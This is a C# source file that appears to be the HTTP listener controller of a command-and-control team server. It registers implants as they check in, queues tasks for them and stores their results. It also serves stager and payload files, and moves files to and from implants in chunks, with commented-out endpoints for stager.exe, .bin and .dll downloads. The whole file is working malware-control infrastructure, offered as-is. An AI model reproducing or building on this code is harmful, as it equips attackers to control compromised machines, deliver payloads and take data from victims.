using ApiModels.Response;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Models.File;
using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private IAgentService _agentService;
        private IFileService _fileService;
        private IListenerService _listenerService;
        private IBinMakerService _binMakerService;
        private ILoggerFactory _loggerFactory;

        public HttpListenerController(IAgentService agentService, IFileService fileService, IListenerService listenerService, IBinMakerService binMakerService, ILoggerFactory loggerFactory)
        {
            this._agentService=agentService;
            this._fileService = fileService;
            this._listenerService = listenerService;
            this._binMakerService = binMakerService;
            this._loggerFactory = loggerFactory;
        }


        public async Task<IActionResult> WebHost(string id)
        {
            //var logger = _loggerFactory.CreateLogger("WebHost");
            //logger.LogInformation($"{id}");
            string fileName = Path.GetFileName(id);

            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());

            if (listener == null)
            {
                //logger.LogError($"NOT FOUND {fileName} => No listener at {this.Request.GetListenerUri()}");
                Logger.Log($"NOT FOUND {fileName} => No listener at {this.Request.GetListenerUri()}");
                return this.NotFound();
            }

            var path = _fileService.GetListenerPath(listener.Name);
            path = Path.Combine(path, fileName);

            if (!System.IO.File.Exists(path))
            {
                //logger.LogError($"NOT FOUND {fileName} from listener {listener.Name}");
                Logger.Log($"NOT FOUND {fileName} from listener {listener.Name}");
                return this.NotFound();
            }

            Logger.Log($"GET {fileName} from listener {listener.Name}");

            return this.File(System.IO.File.ReadAllBytes(path), "application/octet-stream");
        }


        public async Task<IActionResult> HandleImplant(string id)
        {

            //var metadata = ExtractMetadata(HttpContext.Request.Headers);
            //if (metadata == null)
            //    return Content("<html>Hello</html>");

            var agent = this._agentService.GetAgent(id);
            if (agent == null)
            {
                agent = new Agent(id);
                agent.QueueTask(new AgentTask() { Command = "meta", Id = Guid.NewGuid().ToString() });
                this._agentService.AddAgent(agent);
            }

            agent.CheckIn();

            //string calledUri = this.Request.GetListenerUri();

            //System.IO.File.AppendAllText("log.log", calledUri + Environment.NewLine);

            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
            if (listener != null)
            {
                //System.IO.File.AppendAllText("log.log", $"Found listener {listener.Id} with {listener.Uri}" + Environment.NewLine);
                agent.ListenerId = listener.Id;
            }

            if (HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                    json = await sr.ReadToEndAsync();

                var result = JsonConvert.DeserializeObject<ResultData>(json);

                if (result.Metadata != null)
                    agent.Metadata = result.Metadata;

                agent.AddTaskResults(result.Results);

                ////Logger.Log($"Saving resulst of {agent.Metadata.Id}");
                _fileService.SaveResults(agent, result.Results);
            }


            var tasks = agent.GetPendingTaks();

            return Ok(tasks);
        }



        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            //Auhorization: Bearer <base64>
            if (!headers.TryGetValue("Authorization", out var encodedMetaDataHeader))
                return null;

            var encodedMetaData = encodedMetaDataHeader.ToString();

            if (!encodedMetaData.StartsWith("Bearer "))
                return null;

            encodedMetaData = encodedMetaData.Substring(7, encodedMetaData.Length - 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetaData));
            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }

        #region Download
        public IActionResult SetupDownload(string id)
        {
            var desc = _fileService.GetFile(id);
            if (desc == null)
                return NotFound();

            return Ok(new FileDescriptorResponse()
            {
                Id = desc.Id,
                Name = desc.Name,
                Length = desc.Length,
                ChunkCount = desc.ChunkCount,
                ChunkSize = desc.ChunkSize,
            });
        }

        [HttpGet("DownloadChunk/{id}/{chunkIndex}")]
        public IActionResult DownloadChunk(string id, int chunkIndex)
        {
            var desc = _fileService.GetFile(id);
            if (chunkIndex < 0 || chunkIndex >= desc.ChunkCount)
                return NotFound();

            var chunck = desc.Chunks[chunkIndex];
            chunck.IsDownloaded = true;

            _fileService.CleanDownloaded();

            //Logger.Log($"File {desc.Name} => Downloading chunck #{chunck.Index} with length of {chunck.Data.Length} | index requested = {chunkIndex} of {desc.Chunks.Count}");

            //if(desc.IsDownloaded)
            //    Logger.Log($"File {desc.Name} uploaded with {desc.ChunkCount} chunks");

            return Ok(new FileChunckResponse()
            {
                Data = chunck.Data,
                FileId = chunck.FileId,
                Index = chunck.Index,
            });
        }
        #endregion

        #region Upload
        [HttpPost("Upload/Setup")]
        public IActionResult SetupUpload([FromBody] FileDescriptor desc)
        {
            if (string.IsNullOrEmpty(desc.Id))
                return NotFound();

            _fileService.AddFile(desc);
            return Ok();
        }

        [HttpPost("Upload/Chunk")]
        public IActionResult UploadChunk([FromBody] FileChunk chunk)
        {
            var desc = _fileService.GetFile(chunk.FileId);
            if (desc == null)
                return NotFound();

            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata == null)
                return NotFound();

            desc.Chunks.Add(chunk);

            return Ok();
        }
        #endregion

        //public IActionResult ModuleInfo([FromBody] AgentTaskResult res)
        //{
        //    //System.IO.File.AppendAllText("log.log", $"ModuleInfo called.{Environment.NewLine}");
        //    foreach (var agent in this._agentService.GetAgents())
        //    {
        //        var existing = agent.GetTaskResult(res.Id);
        //        if (existing != null)
        //        {
        //            //System.IO.File.AppendAllText("log.log", $"Found at {existing.Id}{Environment.NewLine}");
        //            existing.Status = res.Status;
        //            existing.Info = res.Info;
        //            existing.Result = res.Result;

        //            _fileService.SaveResults(agent, new List<AgentTaskResult> { existing });

        //            break;
        //        }
        //    }

        //    return Ok();
        //}


        //public IActionResult DownloadStagerExe()
        //{
        //    var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
        //    if (listener == null)
        //        return NotFound("No corresponding Listener");

        //    var path = this._fileService.GetListenerPath(listener.Name);
        //    var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentExeFileName);
        //    if (!System.IO.File.Exists(fileName))
        //        return NotFound();

        //    byte[] fileBytes = null;
        //    using (FileStream fs = System.IO.File.OpenRead(fileName))
        //    {
        //        fileBytes = new byte[fs.Length];
        //        fs.Read(fileBytes, 0, (int)fs.Length);
        //    }


        //    return File(fileBytes, "application/octet-stream", "stager.exe");
        //}

        //public IActionResult DownloadStagerBin()
        //{
        //    var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
        //    if (listener == null)
        //        return NotFound("No corresponding Listener");

        //    var path = this._fileService.GetListenerPath(listener.Name);
        //    var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentBinFileName);
        //    if (!System.IO.File.Exists(fileName))
        //        return NotFound();

        //    byte[] fileBytes = null;
        //    using (FileStream fs = System.IO.File.OpenRead(fileName))
        //    {
        //        fileBytes = new byte[fs.Length];
        //        fs.Read(fileBytes, 0, (int)fs.Length);
        //    }

        //    return File(fileBytes, "application/octet-stream", "stager.bin");
        //}

        //public IActionResult DownloadStagerDll()
        //{
        //    var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
        //    if (listener == null)
        //        return NotFound("No corresponding Listener");

        //    var path = this._fileService.GetListenerPath(listener.Name);
        //    var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentDllFileName);
        //    if (!System.IO.File.Exists(fileName))
        //        return NotFound();

        //    byte[] fileBytes = null;
        //    using (FileStream fs = System.IO.File.OpenRead(fileName))
        //    {
        //        fileBytes = new byte[fs.Length];
        //        fs.Read(fileBytes, 0, (int)fs.Length);
        //    }

        //    return File(fileBytes, "application/octet-stream", "stager.dll");
        //}
    }
}
